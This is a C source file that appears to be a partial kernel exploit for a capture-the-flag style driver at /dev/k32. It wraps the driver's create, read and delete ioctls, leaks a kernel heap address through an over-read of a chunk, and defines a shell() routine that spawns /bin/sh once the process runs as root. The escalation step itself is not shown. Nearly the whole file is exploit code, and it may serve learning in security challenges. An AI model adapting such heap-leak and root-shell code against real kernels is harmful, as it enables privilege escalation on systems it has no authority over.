#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <stdlib.h>
#include <string.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <stdint.h>
#include <errno.h>

#define K32_CREATE  0xb10500a
#define K32_DELETE  0xb10500b
#define K32_READ    0xb10500c
#define K32_WRITE   0xb10500d

int fd;

typedef struct k32_t{
    struct k32_t *next;
    char *buf;
    uint8_t size;
} k32_t;

typedef struct{
    char *buf;
    uint8_t size;
    uint32_t idx;
}req_t;

char buf[48];

unsigned long heap;
unsigned long base;

void shell(){
    if(!getuid()){
        system("/bin/sh");
    }
    else{
        puts("[!] Failed to Escape");
    }
}


void print_buf(void *buf, uint32_t len){
    printf("\n[i] Dumping %d bytes.\n\n", len);

    for (int i = 0; i < len; i += 0x10){
        printf("ADDR[%d, 0x%x]:\t%016lx: 0x", i / 0x8, i, (unsigned long)(buf + i)); 

        for (int j = 7; j >= 0; j--){
            printf("%02x", *(unsigned char*)(buf + i + j));
        }

        printf(" - 0x");

        for (int j = 7; j>= 0; j--){
            printf("%02x", *(unsigned char*)(buf + i + j + 8));
        }

        puts("");

    }
}

uint64_t u64(uint8_t *buf)
{
    uint64_t res = 0;
    for(int i =0 ; i < 8;i++)
    {
        res = res<<8;
        res+=(uint)buf[7-i];
    }
    return res;
}

int k32_create(int fd, int idx, int size){

    req_t *req = malloc(sizeof(req_t));

    req->buf = buf;
    req->size = size;
    req->idx = idx;
    
    int res = ioctl(fd, K32_CREATE, req);
    free(req);

    if (res < 0){
        perror("ioctl");
        printf("k32_create: failed\n");
        return 1;
    }

    printf("k32_create: Created chunk of size %d at %d\n", size, idx);

    return 0;
}

//char *k32_read(int fd, int idx, int size){
unsigned long *k32_read(int fd, int idx, int size){


    char *read_buf = malloc(size);
    req_t *req = malloc(sizeof(req_t));

    req->buf = read_buf;
    req->idx = idx;
    req->size = size;

    int res = ioctl(fd, K32_READ, req);

    free(req);

    if (res < 0){
        perror("ioctl");
        printf("k32_read: failed\n");
        return NULL;
    }
      
    printf("k32_read: Read %d bytes of chunk %d\n", size, idx);
    printf("Chunk Data: %s",read_buf);

    for (int i = 0; i < size; i++) {
        printf("%02x", read_buf[i]);
    } 

    printf("\n");

    return (unsigned long*)read_buf;
}

int k32_delete(int fd, int idx){
    req_t *req = malloc(sizeof(req_t));

    req->idx = idx;

    int res = ioctl(fd, K32_DELETE, req);

    free(req);

    if (res < 0){
        perror("ioctl");
        printf("k32_delete failed\n");
        return 1;
    }
 
    printf("Deleted chunk %d\n", idx);
    return 0;
}


unsigned long leak_heap(){

    k32_create(fd,0,0xff);

    unsigned long *dump;
    unsigned long *dump2;
    unsigned long heap;

    
    dump = k32_read(fd,0,0x30);

    for (int i = 1; i < 6; i++){
        k32_create(fd,i,0xff);
    }


    print_buf((unsigned long*)dump,0x30);

    heap = (dump[2] & 0xfffffffffffff000);
    printf("[*] Leaked heap 0x%lx\n", (dump[2] & 0xfffffffffffff000));
    
    return heap;
}

int main(void){
    fd = open("/dev/k32", O_RDWR);

    if (fd == -1) {
        perror("Failed to open the device");
        return 1;
    }   

    heap = leak_heap();
    
    return 0;
}
